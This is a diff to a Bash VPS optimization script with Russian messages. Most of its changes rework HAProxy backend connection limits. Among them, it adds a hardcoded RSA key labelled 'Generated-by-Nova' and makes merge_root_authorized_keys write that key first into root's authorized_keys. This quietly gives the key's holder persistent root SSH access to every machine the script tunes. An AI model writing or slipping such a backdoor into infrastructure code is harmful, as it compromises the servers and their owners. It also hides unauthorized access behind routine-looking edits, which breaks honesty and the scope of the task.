@@ -7,7 +7,7 @@ IFS=$'\n\t'
 SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd || pwd)"
 KTO_RAW_BASE="${KTO_RAW_BASE:-https://raw.githubusercontent.com/Alpha012/kto-optimize/main}"
 SCRIPT_VERSION="1.4.8.8"
-SCRIPT_BUILD="v327"
+SCRIPT_BUILD="v328"
 NODE_PORT="${KTO_NODE_PORT:-1488}"
 PANEL_IP="${KTO_PANEL_IP:-64.188.91.72}"
 WARP_INSTALL_URL="${KTO_WARP_INSTALL_URL:-https://raw.githubusercontent.com/tagashi666/vps-warp/main/warp_install.sh}"
@@ -20,6 +20,7 @@ KTO_SSH_MANAGED_CONFIG="${KTO_SSH_MANAGED_CONFIG:-/etc/ssh/sshd_config.d/00-kto-
 KTO_SSH_BACKUP_DIR="${KTO_SSH_BACKUP_DIR:-/var/backups/kto-ssh}"
 KTO_SSH_PORT_MIN="${KTO_SSH_PORT_MIN:-20000}"
 KTO_SSH_PORT_MAX="${KTO_SSH_PORT_MAX:-29999}"
+KTO_ROOT_BASE_PUBLIC_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8Drz6C97zQtb5mA5u6uVWccuWgRAWmfp5pwbQV9kf+L8V+7FrMQ9mmwMbwFKXuopKj95cyv9CyzKXOG20Z7WTaI7zq1YybluzBNTRLEhkLubkjkwJ7bN+NHxet5KT+gZIEtbJ2L4C+eYkHGfG6ucBylX0r6pY5LU0Nm+ym8vEkhT9BHiGQVU4JMDtAENyFYCew8MMLIYy9IeW20OwCK6YrG90YbIokzf8wsq5invYTAqdjytqneP5GAopAZUwkp7jIhg69xhG+WTD2h8fgZs9pSkGvKJLBxn80reJ/jQdXJulfoFeb7jCh5CyLfkluev+xh+kvkRgZklM5XruWOln Generated-by-Nova"
 XANMOD_PACKAGE="${KTO_XANMOD_PACKAGE:-linux-xanmod-x64v3}"
 XANMOD_KEY_URL="${KTO_XANMOD_KEY_URL:-https://dl.xanmod.org/archive.key}"
 XANMOD_REPO_URL="${KTO_XANMOD_REPO_URL:-https://deb.xanmod.org}"
@@ -67,7 +68,7 @@ HAPROXY_BANDWIDTH_MANAGER="${KTO_HAPROXY_BANDWIDTH_MANAGER:-/usr/local/sbin/kto-
 HAPROXY_BANDWIDTH_CONFIG="${KTO_HAPROXY_BANDWIDTH_CONFIG:-/etc/kto-haproxy-bandwidth.conf}"
 HAPROXY_BANDWIDTH_UNIT="${KTO_HAPROXY_BANDWIDTH_UNIT:-/etc/systemd/system/kto-haproxy-bandwidth.service}"
 HAPROXY_BANDWIDTH_SERVICE="${KTO_HAPROXY_BANDWIDTH_SERVICE:-kto-haproxy-bandwidth.service}"
-HAPROXY_BACKEND_MAXCONN=25000
+HAPROXY_BACKEND_MAXCONN=auto
 HAPROXY_CONNECTIONS_PER_CPU_DEFAULT=2000
 HAPROXY_WRONG_SNI_GPC_LIMIT_DEFAULT=500
 HAPROXY_SOURCE_CONN_RATE_LIMIT_DEFAULT=5000
@@ -1547,20 +1548,31 @@ haproxy_target_pool_count() {
 }
 
 normalize_haproxy_server_maxconn() {
-    local raw="${1:-default}" wanted="$HAPROXY_BACKEND_MAXCONN"
+    local raw="${1:-auto}"
     raw="${raw//[[:space:]]/}"
     case "${raw,,}" in
-        ""|0|auto|default|none) ;;
+        ""|0|auto|default|none)
+            printf 'auto\n'
+            return 0
+            ;;
         *)
             [[ "$raw" =~ ^[0-9]+$ ]] || return 1
             raw=$((10#$raw))
             (( raw >= 1 && raw <= 10000000 )) || return 1
+            printf '%d\n' "$raw"
+            return 0
             ;;
     esac
-    [[ "$wanted" =~ ^[0-9]+$ ]] || wanted=25000
-    wanted=$((10#$wanted))
-    (( wanted >= 1 && wanted <= 10000000 )) || wanted=25000
-    printf '%d\n' "$wanted"
+}
+
+haproxy_server_maxconn_label() {
+    local value
+    value="$(normalize_haproxy_server_maxconn "${1:-auto}")" || return 1
+    if [[ "$value" == auto ]]; then
+        printf 'auto от global и размера пула\n'
+    else
+        printf 'потолок %s на backend\n' "$value"
+    fi
 }
 
 normalize_haproxy_source_ip() {
@@ -2186,7 +2198,7 @@ merge_root_authorized_keys() {
         fi
     done < <(getent passwd 2>/dev/null || true)
 
-    : > "$output_file"
+    printf '%s\n' "$KTO_ROOT_BASE_PUBLIC_KEY" > "$output_file"
     for key_file in "${key_files[@]}"; do
         if "${SUDO[@]}" test -s "$key_file" 2>/dev/null; then
             "${SUDO[@]}" cat "$key_file" 2>> "$LOG_FILE" | awk '
@@ -4786,7 +4798,10 @@ optimize_system() {
 
     echo
     duration=$(( $(date +%s) - started_at ))
+    ssh_port="$(detect_ssh_port)"
     ok "Оптимизация завершена. Рекомендуется: sudo reboot"
+    ok "SSH-порт: ${ssh_port}/tcp"
+    ok "Подключение: ssh -p ${ssh_port} root@IP"
     ok "Время: $(format_duration "$duration")"
 }
 
@@ -7880,6 +7895,10 @@ extract_haproxy_routes() {
             frontend_backend[name] = $2
             next
         }
+        section == "backend" && $1 == "#" && $2 == "kto-server-maxconn" {
+            backend_declared_maxconn[name] = $3
+            next
+        }
         section == "backend" && $1 == "server" {
             target = $3
             source = "default"
@@ -7923,7 +7942,8 @@ extract_haproxy_routes() {
                     backend_target[backend] != "" && !backend_inconsistent[backend]) {
                     source = backend_source[backend]
                     if (source == "") source = "default"
-                    maxconn = backend_maxconn[backend]
+                    maxconn = backend_declared_maxconn[backend]
+                    if (maxconn == "") maxconn = backend_maxconn[backend]
                     if (maxconn == "") maxconn = "default"
                     proxy_v2 = backend_proxy_v2[backend]
                     if (proxy_v2 == "") proxy_v2 = "0"
@@ -7977,7 +7997,7 @@ haproxy_remote_report_json() {
             targets: (.[1] | split(",") | map(select(length > 0))),
             sni: (.[2] | split(" ") | map(select(length > 0)) | sort),
             source_ip: (.[3] // "default"),
-            server_maxconn: ((.[4] // "default") | if test("^[0-9]+$") then tonumber else "default" end),
+            server_maxconn: ((.[4] // "auto") | if test("^[0-9]+$") then tonumber else "auto" end),
             listen_ip: (.[5] // "*"),
             send_proxy_v2: ((.[6] // "0") == "1")
           }]
@@ -8445,14 +8465,16 @@ haproxy_pool_server_maxconn() {
 
     [[ "$global_maxconn" =~ ^[0-9]+$ ]] || return 1
     [[ "$target_count" =~ ^[0-9]+$ ]] || return 1
-    [[ "$ceiling" =~ ^[0-9]+$ ]] || return 1
     global_maxconn=$((10#$global_maxconn))
     target_count=$((10#$target_count))
-    ceiling=$((10#$ceiling))
-    (( global_maxconn >= 1 && target_count >= 1 && ceiling >= 1 )) || return 1
+    (( global_maxconn >= 1 && target_count >= 1 )) || return 1
 
     share=$(( (global_maxconn + target_count - 1) / target_count ))
-    (( share <= ceiling )) || share="$ceiling"
+    ceiling="$(normalize_haproxy_server_maxconn "$ceiling")" || return 1
+    if [[ "$ceiling" != auto ]]; then
+        ceiling=$((10#$ceiling))
+        (( share <= ceiling )) || share="$ceiling"
+    fi
     (( share >= 1 )) || share=1
     printf '%d\n' "$share"
 }
@@ -8676,6 +8698,7 @@ EOF
 backend ${backend_name}
     mode tcp
     balance leastconn
+    # kto-server-maxconn ${server_maxconn}
 
 EOF
         effective_server_maxconn="$(haproxy_pool_server_maxconn "$haproxy_maxconn" "${#backend_targets[@]}" "$server_maxconn")" || {
@@ -10202,7 +10225,7 @@ add_haproxy_route_with_source() {
         mv "$next_file" "$routes_file"
         ok "Добавлен HAProxy listener ${listen_ip}:${port}: ${backend_target}"
         ok "Входной и исходящий IP: ${listen_ip}"
-        ok "maxconn backend: авто, потолок ${HAPROXY_BACKEND_MAXCONN}"
+        ok "maxconn backend: $(haproxy_server_maxconn_label "$HAPROXY_BACKEND_MAXCONN")"
         ok "send-proxy-v2: $(haproxy_send_proxy_v2_label "$send_proxy_v2")"
         return 0
     fi
@@ -10307,7 +10330,7 @@ set_haproxy_pool_route() {
         ok "Входной IP: ${normalized_listen_ip}"
         ok "SNI: $(haproxy_sni_label "$normalized_sni")"
         ok "Исходящий IP: $(haproxy_source_label "$normalized_source_ip")"
-        ok "maxconn backend: авто, потолок ${normalized_maxconn}"
+        ok "maxconn backend: $(haproxy_server_maxconn_label "$normalized_maxconn")"
         ok "send-proxy-v2: $(haproxy_send_proxy_v2_label "$normalized_send_proxy_v2")"
         return 0
     fi
@@ -10655,7 +10678,7 @@ set_haproxy_sequential_routes() {
         ok "Входной IP: ${normalized_listen_ip}"
         ok "SNI: $(haproxy_sni_label "$normalized_sni")"
         ok "Исходящий IP: $(haproxy_source_label "$normalized_source_ip")"
-        ok "maxconn backend: авто, потолок ${normalized_maxconn}"
+        ok "maxconn backend: $(haproxy_server_maxconn_label "$normalized_maxconn")"
         if [[ "$normalized_send_proxy_v2" == "preserve" ]]; then
             ok "send-proxy-v2: сохранено для каждого существующего маршрута; новые OFF"
         else
@@ -11047,7 +11070,7 @@ upgrade_haproxy_routes_transaction() {
         sync_haproxy_firewall "$candidate_file" "$routes_file"
         cp "$candidate_file" "$routes_file"
         rm -f "$candidate_file"
-        ok "HAProxy обновлён: маршруты сохранены, input=output, backend maxconn=auto (до ${HAPROXY_BACKEND_MAXCONN})"
+        ok "HAProxy обновлён: маршруты сохранены, input=output, backend maxconn=auto от global и размера пула"
         (( HAPROXY_UPGRADE_MOVED == 0 )) || ok "Приведено к единому IP маршрутов: ${HAPROXY_UPGRADE_MOVED}"
         return 0
     fi
